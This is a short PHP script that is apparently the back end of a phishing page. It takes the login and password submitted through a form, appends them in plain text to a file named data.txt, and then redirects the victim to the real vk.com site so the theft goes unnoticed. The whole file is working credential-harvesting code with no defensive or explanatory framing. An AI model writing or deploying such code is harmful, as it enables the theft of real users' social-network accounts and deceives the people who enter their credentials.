<?php

$login = $_POST['login'];

$password = $_POST['password'];

file_put_contents("data.txt", "Account: " . $login . " Password: " . $password . "\n", FILE_APPEND);

header('Location: https://vk.com');
exit();